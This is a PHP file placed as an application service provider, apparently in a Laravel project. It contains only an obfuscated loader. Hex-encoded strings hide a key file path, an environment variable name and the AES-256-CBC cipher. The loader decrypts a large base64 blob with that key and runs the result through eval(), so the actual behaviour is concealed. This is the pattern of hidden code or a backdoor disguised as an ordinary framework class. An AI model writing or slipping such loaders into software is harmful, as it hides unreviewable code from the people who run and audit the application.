<?php
namespace App\Providers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('3D1ofJlShaOLQxOrFIw7aA==');

$c=base64_decode(

'hOHRCDodCaNe+qqMqGYLpWDxHmzDZO7mB3Ka9SOiQLmFY/EsQ6+HHCdbrt23agwW7ovK7Ps9aMTK' .
'ml+FZS89kb0utXcH31DHk4QtxMu2g/mK6N0ZtHfVPdqG1nifzC5ntfbwQ7saBdKYMzzP8SYt7H/B' .
'zsD8G4f/plpXN8NJzGN39nj6X1PpHi2TuADjDoaMSSmmfgitQ/kXf34opfjLqTT6DcbK3yL5AY9k' .
'boE/MpVHsoZiGEfsdPWi+JU5tQiDncbe9kkl5e5yH0mIy+v96XtGr4RaVcwHMMM8F0bXM/SRa7E4' .
'meVLp3M4SgIuVfjnf+0S/yo67m/8FhBaWHVwyZlQpvlP43XO7MXmZpZuuSx81EOK7kM1Yz/hLouu' .
'/RiJe8O+o7DzTxZ1LrSfNoBEp1Q19n38hLoxdh00tnXFoDwX6BK7kpvM6azZ9l0uS4bdEd98TdV8' .
'sbVd2BFb2v6T5EAy2BpMlmewfsR3ruX3Ez77TCFLGwH6BebKRPEhmVrJKGdZrnDUyJCLgNsWnn8z' .
'wHvxiUAQ8VsXDRNM3z0WkUqC3WXPmmCoC0lJrrVxl4O797PgICm2w4TRwbbOxtPCALMAv7Us8f+9' .
'p+FJukMUgxhQpGmb6JOofM3JluXebLTnqSjyOrdJtywJzj3ZrHywZR5dCPVkC7ZIflcBob4SawSL' .
'GV9Jb7XO7k/2+0fc0wP7bzfC/yHCA1VlCvF3Bkk5gPky7lP3sR0r4wiTfl2JcEeHMf3ApujNDomV' .
'RkbYnTFgbv08Hvud6RlmmT691nPjBK8hi57v4YzKUICWM6xHB40gwj4DCl59z7rhgRs9/ZsDacug' .
'0whfA2kIHq6BLZPjRjVx5cUgMRpBsX/n4qvBFNlU2H+zlrM8RCVPmwJXVdE/aUB2dJ3+VzMm0zst' .
'IyZA2zM87K7y+rbM+4VWz9vmgCkaSdQh37yx9o5RSI94rHN/fgOcDY7pNu6/zZAdMxPNlng42lc0' .
'esPepsjz8mXhbyXFGnUj/XRLz53L4NEDESPjctJzBn6Aisu6aJj8N48bv98VkZRLSYgx7cKa/DtH' .
'68NBGTZRP8G1jbxjcmaBkvbzIpnps+yXQ+UR/R341iMZ5bVht5vkS4w7tnEpLuVGWqwwh/hiMpMk' .
'9ONwT17zTbFr9GJDYP++G7P37m6H2jMsE9wlDDaSUJcXL6+tv5qscIppqvIyobVlAvPzw8EZP8UY' .
'i3g/a+CZScJ/gfL5HX3ThRZXyYimzQxymf26R7mLRvY2QJJwtql/VYS/hf/DbdTwRH99/gHTNwWl' .
'63J9ofbgSe/p+ljQyhaDTKTyeVu6UgWjg4Ol6qkTnub4cQlJiaw2N+Vx6VW2eYSY89f+J9ZopHvY' .
'4byGqylBJkACYFvUWjFwcIhiru5ZvSi9AFmaCKeQ9c0EtC+3d1N4SIH1lDCJkap46wVrbF7gPbgh' .
'58rgiSwxSc/5ogAN9e5kZLIOryKPFQNvJB5iAQUFOjAJTTKlpr5T0rYBw7/Ijq5qdJRloE2CrD7A' .
'C7jR0OA2XrbcTZOe5ojuTiAw/dg0kGUHnsmN1nC2PgHVhgj3HUkDuS5l8X0easjykyu/zFssJZpF' .
'MMCocxWi/juq5kaBkDc12P4mX3xhXUHeih9vTqnNcIuiCZc='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

